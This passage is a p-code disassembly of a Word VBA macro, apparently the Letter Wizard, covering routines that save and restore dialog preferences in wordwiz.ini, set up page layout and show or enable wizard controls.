' 	LitDI2 0x0001 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1198:
' 	LitStr 0x0007 "chkloID"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1199:
' 	LitStr 0x0013 "chkloWriterInitials"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1200:
' 	LitStr 0x0013 "chkloTypistInitials"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1201:
' 	LitStr 0x0007 "chkloCC"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1202:
' 	LitStr 0x000F "chkloEnclosures"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1203:
' 	LitStr 0x0010 "chkloAttachments"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1204:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #1205:
' 	LitStr 0x000D "UseLetterhead"
' 	LitDI2 0x0001 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1206:
' 	QuoteRem 0x0000 0x0001 "4"
' Line #1207:
' 	LitStr 0x0012 "LetterHeadPosition"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1208:
' 	LitDI2 0x0001 
' 	UMi 
' 	St gCurrentHeadingPosition 
' Line #1209:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd StateItems__ 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	SelectCase 
' 	QuoteRem 0x003C 0x0012 "LetterHeadPosition"
' Line #1210:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #1211:
' 	LitStr 0x0008 "AtTheTop"
' 	St a$ 
' Line #1212:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #1213:
' 	LitStr 0x0009 "OnTheLeft"
' 	St a$ 
' Line #1214:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #1215:
' 	LitStr 0x000A "OnTheRight"
' 	St a$ 
' Line #1216:
' 	CaseElse 
' Line #1217:
' 	LitStr 0x0018 "Internal error (LHP bad)"
' 	Ld wizname$ 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #1218:
' 	EndSelect 
' Line #1219:
' 	LitStr 0x0008 "tip5text"
' 	LitStr 0x0004 "tip5"
' 	Ld a$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #1220:
' 	Ld GetDefaultUnits 
' 	St unit 
' Line #1221:
' 	LitStr 0x0013 "textLetterheadSpace"
' 	LitDI2 0x0002 
' 	Ld unit 
' 	ArgsLd ConvertInchesToUnits 0x0002 
' 	Ld unit 
' 	ArgsLd PrettyMeasurement$ 0x0002 
' 	ArgsCall RstDlgPref 0x0002 
' Line #1222:
' 	QuoteRem 0x0000 0x0001 "5"
' Line #1223:
' 	LitStr 0x0014 "textRecipientAddress"
' 	LitStr 0x0014 "prefRecipientAddress"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	ArgsCall RstDlgMultiLinePref 0x0002 
' Line #1224:
' 	LitStr 0x0011 "textReturnAddress"
' 	Ld toui 
' 	MemLd Address 
' 	ArgsCall RstDlgMultiLinePref 0x0002 
' Line #1225:
' 	QuoteRem 0x0000 0x0001 "6"
' Line #1226:
' 	LitStr 0x0008 "WizStyle"
' 	LitDI2 0x0000 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1227:
' 	QuoteRem 0x0000 0x0006 "finish"
' Line #1228:
' 	LitStr 0x000E "HelpOrEnvelope"
' 	LitDI2 0x0001 
' 	ArgsCall RstDlgValPref 0x0002 
' Line #1229:
' 	ArgsCall PickStylePreview 0x0000 
' Line #1230:
' 	LitStr 0x000D "UseLetterhead"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall UpdateHeadingPosition 0x0000 
' 	EndIf 
' Line #1231:
' 	Ld kRstStylesheet$ 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #1232:
' 	QuoteRem 0x0000 0x0026 "======================================"
' Line #1233:
' 	LitStr 0x000A "LetterName"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St def$ 
' Line #1234:
' 	Ld def$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x001C 0x003B "oh, goody: Mr. Resume is bossing me around again. Joy, joy."
' Line #1235:
' 	Ld kLookingFor$ 
' 	Ld chQuote$ 
' 	Add 
' 	Ld def$ 
' 	Add 
' 	Ld chQuote$ 
' 	Add 
' 	LitStr 0x0003 "..."
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #1236:
' 	LitStr 0x000C "LetterMethod"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgValue 0x0002 
' 	QuoteRem 0x0030 0x000A "prewritten"
' Line #1237:
' 	LitStr 0x0008 "tip1text"
' 	LitStr 0x0009 "tip1optlm"
' 	LitDI2 0x000B 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAutoText$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' 	QuoteRem 0x0085 0x0016 "For Prewritten Letters"
' Line #1238:
' 	EndIfBlock 
' Line #1239:
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #1240:
' 	EndSub 
' Line #1241:
' Line #1242:
' 	QuoteRem 0x0000 0x0036 "======================================================"
' Line #1243:
' 	QuoteRem 0x0000 0x0019 "%% Common Wizard Routines"
' Line #1244:
' Line #1245:
' 	FuncDefn (Private Sub VerifyEnvirons())
' Line #1246:
' 	Dim 
' 	VarDefn wind
' Line #1247:
' 	Dim 
' 	VarDefn fBadDoc
' Line #1248:
' 	Dim 
' 	VarDefn howser (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsGeneral 0x0001 
' 	Set howser 
' Line #1249:
' 	Ld howser 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #1250:
' 	Ld howser 
' 	MemLd BlueScreen 
' 	St gDoogie 
' Line #1251:
' 	LitDI2 0x0000 
' 	ParamNamed BlueScreen 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #1252:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' Line #1253:
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0000 
' 	QuoteRem 0x001C 0x002A "Disable ESCape (works correctly in dialog)"
' Line #1254:
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameFromWindow$] 0x0000 
' 	St wind$ 
' Line #1255:
' 	Ld wind$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St fBadDoc 
' 	EndIf 
' Line #1256:
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0000 
' 	Ld wind$ 
' 	LitStr 0x0001 "."
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #1257:
' 	LitDI2 0x0001 
' 	St fBadDoc 
' Line #1258:
' 	ElseBlock 
' Line #1259:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #1260:
' 	Ld WordBasic 
' 	ArgsMemLd [Selection$] 0x0000 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St fBadDoc 
' 	EndIf 
' Line #1261:
' 	EndIfBlock 
' Line #1262:
' 	Ld fBadDoc 
' 	IfBlock 
' Line #1263:
' 	Ld kErrBadDoc$ 
' 	Ld kWizname$ 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #1264:
' 	LitDI2 0x0516 
' 	Error 
' Line #1265:
' 	EndIfBlock 
' Line #1266:
' 	QuoteRem 0x0000 0x0055 "After all that, the document may still be bogus (even if we created a new one above!)"
' Line #1267:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' 	QuoteRem 0x001C 0x000C "Clear it out"
' Line #1268:
' 	Ld WordBasic 
' 	ArgsMemCall WW6_EditClear 0x0000 
' Line #1269:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	St workDoc$ 
' 	QuoteRem 0x002C 0x0020 "get name of working doc's window"
' Line #1270:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	QuoteRem 0x0028 0x0021 "make sure no macros are executed!"
' Line #1271:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError FatalError 
' Line #1272:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' 	QuoteRem 0x0028 0x001A "create a new, empty window"
' Line #1273:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' 	QuoteRem 0x0028 0x0015 "re-enable auto macros"
' Line #1274:
' 	QuoteRem 0x0000 0x0017 "grab page setup options"
' Line #1275:
' 	Dim 
' 	VarDefn dlgPgSetup1 (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePageSetup 0x0001 
' 	Set dlgPgSetup1 
' Line #1276:
' 	Dim 
' 	VarDefn dlgPgSetup2 (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FilePageSetup 0x0001 
' 	Set dlgPgSetup2 
' Line #1277:
' 	Ld dlgPgSetup1 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #1278:
' 	Ld WordBasic 
' 	ArgsMemLd Window 0x0000 
' 	St iEmptyDoc 
' 	QuoteRem 0x0028 0x0018 "get window # of this doc"
' Line #1279:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	St emptyDoc$ 
' Line #1280:
' 	LitDI2 0x0001 
' 	St iWorkDoc 
' Line #1281:
' 	Ld iWorkDoc 
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0001 
' 	Ld workDoc$ 
' 	Ne 
' 	Paren 
' 	While 
' 	QuoteRem 0x003A 0x0018 "find our original window"
' Line #1282:
' 	Ld iWorkDoc 
' 	LitDI2 0x0001 
' 	Add 
' 	St iWorkDoc 
' Line #1283:
' 	Wend 
' Line #1284:
' 	Ld iWorkDoc 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall WindowList 0x0001 
' 	QuoteRem 0x0028 0x001A "switch back to working doc"
' Line #1285:
' 	Ld dlgPgSetup2 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FilePageSetup 0x0001 
' Line #1286:
' 	Ld dlgPgSetup1 
' 	MemLd Orientation 
' 	Ld dlgPgSetup2 
' 	MemLd Orientation 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x003F 0x001C "need to swap page dimensions"
' Line #1287:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #1288:
' 	Ld dlgPgSetup1 
' 	MemLd PageHeight 
' 	ArgsLd Val 0x0001 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageWidth 
' Line #1289:
' 	Ld dlgPgSetup1 
' 	MemLd PageWidth 
' 	ArgsLd Val 0x0001 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageHeight 
' Line #1290:
' 	EndWith 
' Line #1291:
' 	ElseBlock 
' Line #1292:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #1293:
' 	Ld dlgPgSetup1 
' 	MemLd PageWidth 
' 	ArgsLd Val 0x0001 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageWidth 
' Line #1294:
' 	Ld dlgPgSetup1 
' 	MemLd PageHeight 
' 	ArgsLd Val 0x0001 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	MemStWith PageHeight 
' Line #1295:
' 	EndWith 
' Line #1296:
' 	EndIfBlock 
' Line #1297:
' 	GoTo NoError 
' Line #1298:
' Line #1299:
' 	Label FatalError 
' Line #1300:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #1301:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #1302:
' Line #1303:
' 	Label NoError 
' Line #1304:
' Line #1305:
' 	EndSub 
' Line #1306:
' Line #1307:
' 	QuoteRem 0x0000 0x0025 "====================================="
' Line #1308:
' Line #1309:
' 	FuncDefn (Private Sub xStorePref(id, val_))
' Line #1310:
' 	Dim 
' 	VarDefn v
' Line #1311:
' 	Ld val_$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "~"
' 	St v$ 
' 	Else 
' 	BoSImplicit 
' 	Ld val_$ 
' 	St v$ 
' 	EndIf 
' Line #1312:
' 	Ld kWizname$ 
' 	Ld id$ 
' 	Ld v$ 
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000C "\wordwiz.ini"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #1313:
' 	EndSub 
' Line #1314:
' Line #1315:
' 	FuncDefn (Private Function xFetchPref(id))
' Line #1316:
' 	Ld kWizname$ 
' 	Ld id$ 
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000C "\wordwiz.ini"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St xFetchPref$ 
' Line #1317:
' 	EndFunc 
' Line #1318:
' Line #1319:
' 	FuncDefn (Private Sub SaveDlgValPref(id))
' Line #1320:
' 	Ld id$ 
' 	LitDI2 0x0001 
' 	Ld id$ 
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	ArgsCall xStorePref 0x0002 
' Line #1321:
' 	EndSub 
' Line #1322:
' Line #1323:
' 	FuncDefn (Private Sub RstDlgValPref(id, defaultVal))
' Line #1324:
' 	Dim 
' 	VarDefn v
' Line #1325:
' 	Dim 
' 	VarDefn nerr
' Line #1326:
' 	Ld kWizname$ 
' 	Ld id$ 
' 	LitStr 0x000B "wordwiz.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	St v 
' 	QuoteRem 0x0060 0x000D "get the value"
' Line #1327:
' 	Ld v 
' 	LitDI2 0x0000 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld defaultVal 
' 	St v 
' 	EndIf 
' 	QuoteRem 0x0024 0x0026 "ensure legal value (unless too big...)"
' Line #1328:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError TooBig 
' Line #1329:
' 	Ld id$ 
' 	Ld v 
' 	Ld WordBasic 
' 	ArgsMemCall DlgValue 0x0002 
' Line #1330:
' 	GoTo rdvpexit 
' Line #1331:
' 	Label TooBig 
' Line #1332:
' 	Ld Err 
' 	MemLd Number 
' 	St nerr 
' Line #1333:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #1334:
' 	Ld nerr 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0018 0x0027 "subscript out of range ... v is too big"
' Line #1335:
' 	Ld id$ 
' 	Ld defaultVal 
' 	Ld WordBasic 
' 	ArgsMemCall DlgValue 0x0002 
' Line #1336:
' 	ElseBlock 
' Line #1337:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0001 
' 	QuoteRem 0x0024 0x001B "make sure this is turned on"
' Line #1338:
' 	Ld nerr 
' 	Error 
' 	QuoteRem 0x0014 0x000E "report the err"
' Line #1339:
' 	EndIfBlock 
' Line #1340:
' 	Label rdvpexit 
' Line #1341:
' 	EndSub 
' Line #1342:
' Line #1343:
' 	FuncDefn (Private Sub SaveDlgPref(id))
' Line #1344:
' 	Ld id$ 
' 	Ld id$ 
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	ArgsCall xStorePref 0x0002 
' Line #1345:
' 	EndSub 
' Line #1346:
' Line #1347:
' 	FuncDefn (Private Sub RstDlgPref(id, defaultStr))
' Line #1348:
' 	Dim 
' 	VarDefn v
' Line #1349:
' 	Ld kWizname$ 
' 	Ld id$ 
' 	LitStr 0x000B "wordwiz.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St v$ 
' Line #1350:
' 	Ld v$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld defaultStr$ 
' 	St v$ 
' 	EndIf 
' Line #1351:
' 	Ld v$ 
' 	LitStr 0x0001 "~"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St v$ 
' 	EndIf 
' Line #1352:
' 	Ld id$ 
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #1353:
' 	EndSub 
' Line #1354:
' Line #1355:
' 	FuncDefn (Private Sub SaveDlgMultiLinePref(id))
' Line #1356:
' 	Dim 
' 	VarDefn v
' Line #1357:
' 	Dim 
' 	VarDefn idx
' Line #1358:
' 	Dim 
' 	VarDefn count_
' Line #1359:
' 	Ld id$ 
' 	Ld WordBasic 
' 	ArgsMemLd [DlgText$] 0x0001 
' 	St v$ 
' Line #1360:
' 	Ld v$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	St idx 
' Line #1361:
' 	LitDI2 0x0001 
' 	St count_ 
' Line #1362:
' 	Ld idx 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	While 
' Line #1363:
' 	Ld id$ 
' 	Ld count_ 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	Ld v$ 
' 	Ld idx 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	ArgsCall xStorePref 0x0002 
' Line #1364:
' 	Ld v$ 
' 	FnLen 
' 	Ld idx 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld v$ 
' 	Ld idx 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	St v$ 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St v$ 
' 	EndIf 
' Line #1365:
' 	Ld v$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	St idx 
' Line #1366:
' 	Ld count_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St count_ 
' Line #1367:
' 	Wend 
' Line #1368:
' 	Ld id$ 
' 	Ld count_ 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	Ld v$ 
' 	ArgsCall xStorePref 0x0002 
' Line #1369:
' 	Ld id$ 
' 	LitStr 0x0005 "Lines"
' 	Add 
' 	Ld count_ 
' 	ArgsLd Str 0x0001 
' 	ArgsCall xStorePref 0x0002 
' Line #1370:
' 	EndSub 
' Line #1371:
' Line #1372:
' 	FuncDefn (Private Sub RstDlgMultiLinePref(id, defaultStr))
' Line #1373:
' 	Dim 
' 	VarDefn count_
' Line #1374:
' 	Dim 
' 	VarDefn v
' Line #1375:
' 	Dim 
' 	VarDefn False
' Line #1376:
' 	Ld id$ 
' 	LitStr 0x0005 "Lines"
' 	Add 
' 	ArgsLd xFetchPref$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St count_ 
' Line #1377:
' 	Ld count_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #1378:
' 	Ld defaultStr$ 
' 	St v$ 
' Line #1379:
' 	ElseBlock 
' Line #1380:
' 	Ld id$ 
' 	Ld count_ 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	ArgsLd xFetchPref$ 0x0001 
' 	St v$ 
' Line #1381:
' 	Ld v$ 
' 	LitStr 0x0001 "~"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St v$ 
' 	EndIf 
' Line #1382:
' 	Ld count_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St count_ 
' Line #1383:
' 	Ld count_ 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #1384:
' 	Ld id$ 
' 	Ld count_ 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	ArgsLd xFetchPref$ 0x0001 
' 	St False$ 
' Line #1385:
' 	Ld False$ 
' 	LitStr 0x0001 "~"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St False$ 
' 	EndIf 
' Line #1386:
' 	Ld False$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld v$ 
' 	Add 
' 	St v$ 
' Line #1387:
' 	Ld count_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St count_ 
' Line #1388:
' 	Wend 
' Line #1389:
' 	EndIfBlock 
' Line #1390:
' 	Ld id$ 
' 	Ld v$ 
' 	Ld WordBasic 
' 	ArgsMemCall DlgText 0x0002 
' Line #1391:
' 	EndSub 
' Line #1392:
' Line #1393:
' 	QuoteRem 0x0000 0x0003 "==="
' Line #1394:
' Line #1395:
' 	FuncDefn (Private Sub ItemsInState(howMany))
' Line #1396:
' 	Ld LastState 
' 	LitDI2 0x0001 
' 	Add 
' 	St LastState 
' Line #1397:
' 	Ld howMany 
' 	Ld LastState 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd StateItems__ 0x0001 
' 	Add 
' 	Ld LastState 
' 	ArgsSt StateItems__ 0x0001 
' Line #1398:
' 	EndSub 
' Line #1399:
' Line #1400:
' 	FuncDefn (Private Sub EnableControls())
' 	QuoteRem 0x001D 0x0017 "Enable/Disable controls"
' Line #1401:
' 	Ld State 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #1402:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' 	QuoteRem 0x0021 0x0005 "<Back"
' Line #1403:
' 	EndIfBlock 
' Line #1404:
' 	Ld State 
' 	Ld LastState 
' 	Lt 
' 	IfBlock 
' Line #1405:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' 	QuoteRem 0x0021 0x0005 "Next>"
' Line #1406:
' 	EndIfBlock 
' Line #1407:
' 	Ld State 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #1408:
' 	LitDI2 0x0006 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' 	QuoteRem 0x001D 0x0005 "Next>"
' Line #1409:
' 	LitDI2 0x0005 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' 	QuoteRem 0x0021 0x0005 "<Back"
' Line #1410:
' 	Ld State 
' 	Ld LastState 
' 	Eq 
' 	ElseIfBlock 
' Line #1411:
' 	LitDI2 0x0007 
' 	Ld WordBasic 
' 	ArgsMemCall DlgFocus 0x0001 
' 	QuoteRem 0x001D 0x0006 "finish"
' Line #1412:
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' 	QuoteRem 0x0021 0x0004 "Next"
' Line #1413:
' 	EndIfBlock 
' Line #1414:
' 	EndSub 
' 	QuoteRem 0x0008 0x000E "EnableControls"
' Line #1415:
' Line #1416:
' Line #1417:
' 	FuncDefn (Private Sub SHControls(FirstField, LimField, SH))
' 	QuoteRem 0x0031 0x0012 "Show/Hide controls"
' Line #1418:
' 	Dim 
' 	VarDefn iField
' Line #1419:
' 	StartForVariable 
' 	Ld iField 
' 	EndForVariable 
' 	Ld FirstField 
' 	Ld LimField 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #1420:
' 	Ld iField 
' 	Ld SH 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1421:
' 	StartForVariable 
' 	Next 
' Line #1422:
' 	EndSub 
' 	QuoteRem 0x0008 0x000A "SHControls"
' Line #1423:
' Line #1424:
' 	FuncDefn (Private Sub EnabFields(FirstField, LimField, ED))
' 	QuoteRem 0x0031 0x0017 "Enable/Disable controls"
' Line #1425:
' 	Dim 
' 	VarDefn iField
' Line #1426:
' 	StartForVariable 
' 	Ld iField 
' 	EndForVariable 
' 	Ld FirstField 
' 	Ld LimField 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #1427:
' 	Ld iField 
' 	Ld ED 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #1428:
' 	StartForVariable 
' 	Next 
' Line #1429:
' 	EndSub 
' 	QuoteRem 0x0008 0x000A "EnabFields"
' Line #1430:
' Line #1431:
' 	FuncDefn (Private Sub ChangeState(sold, snew))
' Line #1432:
' 	Ld sold 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	Ld sold 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall SHControls 0x0003 
' Line #1433:
' 	Ld snew 
' 	ArgsLd HideFilePreview__ 0x0001 
' 	Ld sold 
' 	ArgsLd HideFilePreview__ 0x0001 
' 	Sub 
' 	IfBlock 
' Line #1434:
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0001 
' Line #1435:
' 	EndIfBlock 
' Line #1436:
' 	Ld snew 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	Ld snew 
' 	ArgsLd StateItems__ 0x0001 
' 	Paren 
' 	LitDI2 0x0001 
' 	ArgsCall SHControls 0x0003 
' Line #1437:
' 	Ld snew 
' 	St State 
' Line #1438:
' 	Ld snew 
' 	LitDI2 0x0002 
' 	Eq 
' 	LitStr 0x000C "LetterMethod"
' 	Ld WordBasic 
' 	ArgsMemLd DlgValue 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #1439:
' 	LitStr 0x0007 "chkloID"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1440:
' 	LitStr 0x0013 "chkloWriterInitials"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1441:
' 	LitStr 0x0013 "chkloTypistInitials"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1442:
' 	LitStr 0x0007 "chkloCC"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1443:
' 	LitStr 0x000F "chkloEnclosures"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1444:
' 	LitStr 0x0010 "chkloAttachments"
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DlgVisible 0x0002 
' Line #1445:
' 	EndIfBlock 
' Line #1446:
' 	Rem 0x0041 " Chk if MAPI environment is present to enable AddressBook buttons"
' Line #1447:
' 	Ld snew 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #1448:
' 	LitDI2 0x002B 
' 	LitDI2 0x0000 
' 	Ld kInsertAddress$ 
' 	Ld WordBasic 
' 	ArgsMemLd CommandValid 0x0001 
' 	Sub 
' 	Ld WordBasic 
' 	ArgsMemCall DlgEnable 0x0002 
' Line #1449:
